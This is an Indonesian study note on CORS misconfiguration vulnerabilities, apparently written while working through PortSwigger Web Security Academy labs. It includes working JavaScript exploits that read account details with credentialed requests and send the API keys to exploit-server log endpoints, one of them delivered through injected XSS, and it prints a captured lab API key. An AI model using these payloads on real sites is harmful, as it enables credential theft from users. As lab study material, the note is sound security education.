
## Apa itu CORS (berbagi sumber daya lintas asal)?

Berbagi sumber daya lintas asal (CORS) adalah mekanisme browser yang memungkinkan akses terkontrol ke sumber daya yang terletak di luar domain tertentu. Hal ini memperluas dan menambah fleksibilitas pada kebijakan asal yang sama (SOP). Namun, hal ini juga memberikan potensi serangan lintas domain, jika kebijakan CORS situs web dikonfigurasi dan diterapkan dengan buruk. CORS bukanlah perlindungan terhadap serangan lintas asal seperti pemalsuan permintaan lintas situs (CSRF).

![[Pasted image 20240911150255.png]]

## Same-origin policy

The same-origin policy is spesifikasi lintas asal yang membatasi kemampuan situs web untuk berinteraksi dengan sumber daya di luar domain sumber. Kebijakan asal yang sama ditetapkan beberapa tahun yang lalu sebagai respons terhadap interaksi lintas domain yang berpotensi berbahaya, seperti satu situs web mencuri data pribadi dari situs lain. Biasanya memungkinkan suatu domain untuk mengeluarkan permintaan ke domain lain, tetapi tidak untuk mengakses tanggapannya.


## Kerentanan yang timbul dari masalah konfigurasi CORS

Banyak situs web modern menggunakan CORS untuk mengizinkan akses dari subdomain dan pihak ketiga tepercaya. Penerapan CORS mereka mungkin mengandung kesalahan atau terlalu lunak untuk memastikan semuanya berfungsi, dan hal ini dapat mengakibatkan kerentanan yang dapat dieksploitasi.

---

**Solve LAB 1**

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET', 'YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = '/log?key=' + this.responseText;
    }
</script>
```

## Header ACAO yang dihasilkan server dari header Asal yang ditentukan klien

Beberapa aplikasi perlu menyediakan akses ke sejumlah domain lain. Mempertahankan daftar domain yang diizinkan memerlukan upaya berkelanjutan, dan kesalahan apa pun berisiko merusak fungsionalitas. Jadi beberapa aplikasi mengambil cara mudah untuk secara efektif mengizinkan akses dari domain lain.

Salah satu cara untuk melakukannya adalah dengan membaca header Asal dari permintaan dan menyertakan header respons yang menyatakan bahwa asal permintaan diperbolehkan. Misalnya, pertimbangkan aplikasi yang menerima permintaan berikut:

`GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=...`

Kemudian merespons dengan:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://malicious-website.com Access-Control-Allow-Credentials: true ...`

Header ini menyatakan bahwa akses diperbolehkan dari domain yang meminta ( `malicious-website.com`) dan permintaan lintas asal dapat menyertakan cookie ( `Access-Control-Allow-Credentials: true`) dan akan diproses dalam sesi.

Karena penerapannya mencerminkan asal muasal yang sewenang-wenang dalam `Access-Control-Allow-Origin` header, ini berarti domain mana pun dapat mengakses sumber daya dari domain yang rentan. Jika respons berisi informasi sensitif seperti kunci API atau token CSRF, Anda dapat mengambilnya dengan menempatkan skrip berikut di situs web Anda:

```js
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='//malicious-website.com/log?key='+this.responseText; };
```


**Solve LAB 2**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>

var req = new XMLHttpRequest();

req.onload = reqListener;

req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);

req.withCredentials = true;

req.send();

function reqListener() {

location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);

};

</script>"></iframe>
```

apiKey: YyvOvRrRIoGTMRP31bg4ntBhy5hZZKxj

## Memanfaatkan XSS melalui hubungan kepercayaan CORS - Lanjutan

Mengingat permintaan berikut:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...`

Jika server merespons dengan:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

Kemudian penyerang yang menemukan kerentanan XSS aktif `subdomain.vulnerable-website.com` bisa menggunakannya untuk mengambil kunci API, menggunakan URL seperti:

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`


**Solve LAB 3**

```js
<script>
    document.location = "http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>" +
        "var req = new XMLHttpRequest();" +
        "req.onload = reqListener;" +
        "req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);" +
        "req.withCredentials = true;" +
        "req.send();" +
        "function reqListener() {" +
        "    location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + this.responseText;" +
        "};" +
        "</script>&storeId=1";
</script>
```